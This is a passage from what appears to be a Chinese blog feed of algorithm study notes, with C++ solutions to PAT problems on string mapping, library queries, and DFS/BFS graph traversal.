scanf(&quot;%d%d&quot;,&amp;m,&amp;n);</span></span><br><span class="line"><span class="comment">    while(n--)&#123;</span></span><br><span class="line"><span class="comment">        for(int i=0;i&lt;m;i++)&#123;</span></span><br><span class="line"><span class="comment">            cin&gt;&gt;temp;</span></span><br><span class="line"><span class="comment">            if(color.find(temp)!=color.end())</span></span><br><span class="line"><span class="comment">                color[temp]++;</span></span><br><span class="line"><span class="comment">            else color[temp]=1;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    int MAX=0;</span></span><br><span class="line"><span class="comment">    string ans;</span></span><br><span class="line"><span class="comment">    for(map&lt;string,int&gt;::iterator it=color.begin();it!=color.end();it++)&#123;</span></span><br><span class="line"><span class="comment">        if(it-&gt;second&gt;MAX)&#123;</span></span><br><span class="line"><span class="comment">            ans=it-&gt;first;</span></span><br><span class="line"><span class="comment">            MAX=it-&gt;second;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    cout&lt;&lt;ans;</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//PAT B1044</span></span><br><span class="line"><span class="comment">string low[13]=&#123;&quot;tret&quot;,&quot;jan&quot;, &quot;feb&quot;, &quot;mar&quot;, &quot;apr&quot;, &quot;may&quot;, &quot;jun&quot;, &quot;jly&quot;, &quot;aug&quot;, &quot;sep&quot;, &quot;oct&quot;, &quot;nov&quot;, &quot;dec&quot;&#125;;</span></span><br><span class="line"><span class="comment">string high[13]=&#123;&quot;tret&quot;,&quot;tam&quot;, &quot;hel&quot;, &quot;maa&quot;, &quot;huh&quot;, &quot;tou&quot;, &quot;kes&quot;, &quot;hei&quot;, &quot;elo&quot;, &quot;syy&quot;, &quot;lok&quot;, &quot;mer&quot;, &quot;jou&quot;&#125;;</span></span><br><span class="line"><span class="comment">map&lt;string,int&gt; number;</span></span><br><span class="line"><span class="comment">string str[200];</span></span><br><span class="line"><span class="comment">void init()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;13;i++)&#123;</span></span><br><span class="line"><span class="comment">        number[low[i]]=i;</span></span><br><span class="line"><span class="comment">        str[i]=low[i];</span></span><br><span class="line"><span class="comment">        number[high[i]]=i*13;</span></span><br><span class="line"><span class="comment">        str[13*i]=high[i];</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    for(int i=1;i&lt;13;i++)&#123;</span></span><br><span class="line"><span class="comment">        for(int j=1;j&lt;13;j++)&#123;</span></span><br><span class="line"><span class="comment">            string temp=high[i]+&quot; &quot;+low[j];</span></span><br><span class="line"><span class="comment">            number[temp]=i*13+j;</span></span><br><span class="line"><span class="comment">            str[i*13+j]=temp;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    return;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">int main()</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">    init();</span></span><br><span class="line"><span class="comment">    int num;</span></span><br><span class="line"><span class="comment">    string temp;</span></span><br><span class="line"><span class="comment">    scanf(&quot;%d%*c&quot;,&amp;num);</span></span><br><span class="line"><span class="comment">    while(num--)&#123;</span></span><br><span class="line"><span class="comment">        getline(cin,temp);</span></span><br><span class="line"><span class="comment">        if(temp[0]&gt;=&#x27;0&#x27;&amp;&amp;temp[0]&lt;=&#x27;9&#x27;)&#123;</span></span><br><span class="line"><span class="comment">            int ans=0;</span></span><br><span class="line"><span class="comment">            for(int i=0;i&lt;temp.length();i++)&#123;</span></span><br><span class="line"><span class="comment">                ans=ans*10+temp[i]-&#x27;0&#x27;;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            cout&lt;&lt;str[ans]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        else&#123;</span></span><br><span class="line"><span class="comment">            cout&lt;&lt;number[temp]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    //system(&quot;pause&quot;);</span></span><br><span class="line"><span class="comment">    return 0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>这题答案用了map，我第一反应还是用结构体做的，万幸没超时</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1022</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N=<span class="number">10001</span>;</span><br><span class="line"><span class="built_in">string</span> ans[N];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="built_in">string</span> id;</span><br><span class="line">    <span class="built_in">string</span> title;</span><br><span class="line">    <span class="built_in">string</span> author;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; key;</span><br><span class="line">    <span class="built_in">string</span> publisher;</span><br><span class="line">    <span class="built_in">string</span> year;</span><br><span class="line">&#125;now[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="comment">//scanf(&quot;%d&quot;,&amp;now[i].id);</span></span><br><span class="line">        <span class="comment">//getchar();</span></span><br><span class="line">        getline(<span class="built_in">cin</span>,now[i].id);</span><br><span class="line">        getline(<span class="built_in">cin</span>,now[i].title);</span><br><span class="line">        getline(<span class="built_in">cin</span>,now[i].author);</span><br><span class="line">        <span class="built_in">string</span> temp;</span><br><span class="line">        <span class="comment">//int num=0;</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;temp)&#123;</span><br><span class="line">            now[i].key.push_back(temp);</span><br><span class="line">            <span class="keyword">char</span> c=getchar();</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        getline(<span class="built_in">cin</span>,now[i].publisher);</span><br><span class="line">        getline(<span class="built_in">cin</span>,now[i].year);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//check your input</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;now[i].id&lt;&lt;&quot; &quot;&lt;&lt;now[i].title&lt;&lt;&quot; &quot;&lt;&lt;now[i].author;</span></span><br><span class="line"><span class="comment">        //for(int j=0;j&lt;now[i].key.size();j++) cout&lt;&lt;now[i].key[j]&lt;&lt;&quot; &quot;;</span></span><br><span class="line"><span class="comment">        cout&lt;&lt;endl&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">//query</span></span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="keyword">int</span> cat;  <span class="comment">//query type</span></span><br><span class="line">    <span class="built_in">string</span> temp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">    <span class="keyword">while</span>(m--)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d: &quot;</span>,&amp;cat);</span><br><span class="line">        <span class="comment">//getchar();</span></span><br><span class="line">        getline(<span class="built_in">cin</span>,temp);</span><br><span class="line">        <span class="keyword">if</span>(cat==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;cat&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;temp&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(now[i].title==temp)&#123;</span><br><span class="line">                    ans[num]=now[i].id;</span><br><span class="line">                    num++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;Not Found\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sort(ans,ans+num);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;num;k++)&#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;ans[k]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(cat==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;cat&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;temp&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(now[i].author==temp)&#123;</span><br><span class="line">                    ans[num]=now[i].id;</span><br><span class="line">                    num++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;Not Found\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sort(ans,ans+num);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;num;k++)&#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;ans[k]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(cat==<span class="number">4</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;cat&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;temp&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(now[i].publisher==temp)&#123;</span><br><span class="line">                    ans[num]=now[i].id;</span><br><span class="line">                    num++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;Not Found\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sort(ans,ans+num);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;num;k++)&#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;ans[k]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(cat==<span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;cat&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;temp&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(now[i].year==temp)&#123;</span><br><span class="line">                    ans[num]=now[i].id;</span><br><span class="line">                    num++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;Not Found\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sort(ans,ans+num);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;num;k++)&#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;ans[k]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(cat==<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;cat&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;temp&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;now[i].key.size();j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(now[i].key[j]==temp)&#123;</span><br><span class="line">                        ans[num]=now[i].id;</span><br><span class="line">                        num++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;Not Found\n&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                sort(ans,ans+num);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;num;k++)&#123;</span><br><span class="line">                    <span class="built_in">cout</span>&lt;&lt;ans[k]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>算法笔记_第十章</title>
    <url>/2020/02/24/%E7%AE%97%E6%B3%95%E7%AC%94%E8%AE%B0-%E7%AC%AC%E5%8D%81%E7%AB%A0/</url>
    <content><![CDATA[<p>第十章上机训练</p>
<span id="more"></span>

<h2 id="10-上机"><a href="#10-上机" class="headerlink" title="10(上机)"></a>10(上机)</h2><h3 id="10-3"><a href="#10-3" class="headerlink" title="10.3"></a>10.3</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1034</span></span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2010</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">1000000000</span>;</span><br><span class="line"><span class="keyword">int</span> G[maxn][maxn]=&#123;<span class="number">0</span>&#125;; <span class="comment">//邻接矩阵,无向图</span></span><br><span class="line"><span class="keyword">int</span> weight[maxn]=&#123;<span class="number">0</span>&#125;; <span class="comment">//节点的度,用来找head</span></span><br><span class="line"><span class="keyword">int</span> num=<span class="number">0</span>; <span class="comment">//total people</span></span><br><span class="line"><span class="keyword">bool</span> visit[maxn]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; Gang;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt; stringToInt;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="built_in">string</span>&gt; intToString;</span><br><span class="line"></span><br><span class="line"><span class="comment">//string to int</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">change</span><span class="params">(<span class="built_in">string</span> str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stringToInt.find(str)!=stringToInt.end()) <span class="keyword">return</span> stringToInt[str];</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        stringToInt[str]=num;</span><br><span class="line">        intToString[num]=str;</span><br><span class="line">        <span class="keyword">return</span> num++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//深度遍历一个节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(<span class="keyword">int</span> nowvisit,<span class="keyword">int</span> &amp;head,<span class="keyword">int</span> &amp;numMember,<span class="keyword">int</span> &amp;totalValue)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    numMember++;</span><br><span class="line">    visit[nowvisit]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(weight[nowvisit]&gt;weight[head]) head=nowvisit;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(G[nowvisit][i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            totalValue+=G[nowvisit][i];</span><br><span class="line">            G[nowvisit][i]=G[i][nowvisit]=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(visit[i]==<span class="literal">false</span>) DFS(i,head,numMember,totalValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历整个图</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFSTrave</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(visit[num]==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> head=i,numMember=<span class="number">0</span>,totalValue=<span class="number">0</span>;</span><br><span class="line">            DFS(i,head,numMember,totalValue);</span><br><span class="line">            <span class="keyword">if</span>(numMember&gt;<span class="number">2</span>&amp;&amp;totalValue&gt;k) Gang[intToString[head]]=numMember;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) visit[i]=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> w; <span class="comment">//weight</span></span><br><span class="line">    <span class="built_in">string</span> str1,str2;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;str1&gt;&gt;str2&gt;&gt;w;</span><br><span class="line">        <span class="keyword">int</span> id1=change(str1);</span><br><span class="line">        <span class="keyword">int</span> id2=change(str2);</span><br><span class="line">        weight[id1]+=w;</span><br><span class="line">        weight[id2]+=w;</span><br><span class="line">        G[id1][id2]+=w;</span><br><span class="line">        G[id2][id1]+=w;</span><br><span class="line">    &#125;</span><br><span class="line">    DFSTrave();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,Gang.size());</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>,<span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line">    <span class="keyword">for</span>(it=Gang.begin();it!=Gang.end();it++)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;it-&gt;first&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;it-&gt;second&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//PAT A1076</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">1010</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">int</span> layer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">vector</span>&lt;node&gt; Adj[maxn];</span><br><span class="line"><span class="keyword">bool</span> inq[maxn]=&#123;<span class="literal">false</span>&#125;;</span><br><span class="line"><span class="comment">//本题不用每个节点都BFS一遍，写一个单节点的BFS就好</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">BFS</span><span class="params">(<span class="keyword">int</span> index,<span class="keyword">int</span> layer_max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> numForward=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">queue</span>&lt;node&gt; q;</span><br><span class="line">    node start;</span><br><span class="line">    start.id=index;</span><br><span class="line">    start.layer=<span class="number">0</span>;</span><br><span class="line">    q.push(start);</span><br><span class="line">    inq[start.id]=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span>(!q.empty())&#123;</span><br><span class="line">        node top=q.front();</span><br><span class="line">        q.pop();</span><br><span class="line">        <span class="keyword">int</span> nowid=top.id;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Adj[nowid].size();i++)&#123;</span><br><span class="line">            node next=Adj[nowid][i];</span><br><span class="line">            next.layer=top.layer+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(inq[next.id]==<span class="literal">false</span>&amp;&amp;next.layer&lt;=layer_max)&#123;</span><br><span class="line">                q.push(next);</span><br><span class="line">                inq[next.id]=<span class="literal">true</span>;</span><br><span class="line">                numForward++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> numForward;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    node main;</span><br><span class="line">    <span class="keyword">int</span> n,l;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;l);</span><br><span class="line">    <span class="keyword">int</span> numF,id;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        main.id=i;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;numF);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;numF;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;id);</span><br><span class="line">            Adj[id].push_back(main);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> query,s;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;query);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;query;i++)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(inq,<span class="literal">false</span>,<span class="keyword">sizeof</span>(inq));</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;s);</span><br><span class="line">        <span class="keyword">int</span> numForward=BFS(s,l);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,numForward);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
